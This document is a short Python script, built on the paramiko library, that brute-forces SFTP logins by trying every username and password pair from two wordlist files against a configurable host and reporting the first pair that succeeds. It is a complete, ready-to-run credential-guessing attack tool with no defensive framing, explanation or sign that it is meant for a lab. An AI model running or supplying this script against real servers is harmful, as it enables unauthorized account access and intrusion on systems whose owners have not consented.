import paramiko

def sftp_bruteforce(hostname, port, username_file, password_file):
    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
        usernames = uf.read().splitlines()
        passwords = pf.read().splitlines()

        for username in usernames:
            for password in passwords:
                try:
                    transport = paramiko.Transport((hostname, port))
                    transport.connect(username=username, password=password)
                    sftp = paramiko.SFTPClient.from_transport(transport)
                    print(f"Success: {username}:{password}")
                    sftp.close()
                    transport.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"Failed: {username}:{password}")
                except Exception as e:
                    print(f"Error: {str(e)}")
                    return

# Customize these variables
hostname = 'yourserver'
port = 22
username_file = 'usernames.txt'
password_file = 'passwords.txt'

sftp_bruteforce(hostname, port, username_file, password_file)
